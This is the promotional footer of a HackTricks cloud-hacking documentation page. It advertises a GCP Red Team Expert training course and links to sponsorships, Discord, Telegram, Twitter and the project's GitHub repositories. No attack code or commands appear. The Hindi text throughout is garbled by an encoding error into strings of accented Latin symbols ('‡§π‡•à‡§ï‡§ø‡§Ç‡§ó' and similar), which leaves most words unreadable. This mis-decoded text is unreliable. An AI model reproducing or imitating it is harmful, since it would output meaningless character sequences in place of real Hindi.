GCP ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§∏‡•Ä‡§ñ‡•á‡§Ç ‡§î‡§∞ ‡§Ö‡§≠‡•ç‡§Ø‡§æ‡§∏ ‡§ï‡§∞‡•á‡§Ç: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡•á‡§Ç</summary>

* [**‡§∏‡§¶‡§∏‡•ç‡§Ø‡§§‡§æ ‡§Ø‡•ã‡§ú‡§®‡§æ‡§è‡§Å**](https://github.com/sponsors/carlospolop) ‡§¶‡•á‡§ñ‡•á‡§Ç!
* **‡§π‡§Æ‡§æ‡§∞‡•á** üí¨ [**‡§°‡§ø‡§∏‡•ç‡§ï‡•â‡§∞‡•ç‡§° ‡§∏‡§Æ‡•Ç‡§π**](https://discord.gg/hRep4RUj7f) ‡§Ø‡§æ [**‡§ü‡•á‡§≤‡•Ä‡§ó‡•ç‡§∞‡§æ‡§Æ ‡§∏‡§Æ‡•Ç‡§π**](https://t.me/peass) ‡§Æ‡•á‡§Ç ‡§∂‡§æ‡§Æ‡§ø‡§≤ ‡§π‡•ã‡§Ç ‡§Ø‡§æ **‡§π‡§Æ‡§æ‡§∞‡§æ ‡§Ö‡§®‡•Å‡§∏‡§∞‡§£ ‡§ï‡§∞‡•á‡§Ç** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ü‡•ç‡§∞‡§ø‡§ï‡•ç‡§∏ ‡§∏‡§æ‡§ù‡§æ ‡§ï‡§∞‡•á‡§Ç ‡§î‡§∞** [**HackTricks**](https://github.com/carlospolop/hacktricks) ‡§î‡§∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ‡§ó‡§ø‡§ü‡§π‡§¨ ‡§∞‡§ø‡§™‡•ã‡§ú‡§ø‡§ü‡§∞‡•Ä ‡§Æ‡•á‡§Ç PR ‡§∏‡§¨‡§Æ‡§ø‡§ü ‡§ï‡§∞‡•á‡§Ç‡•§

</details>
{% endhint %}
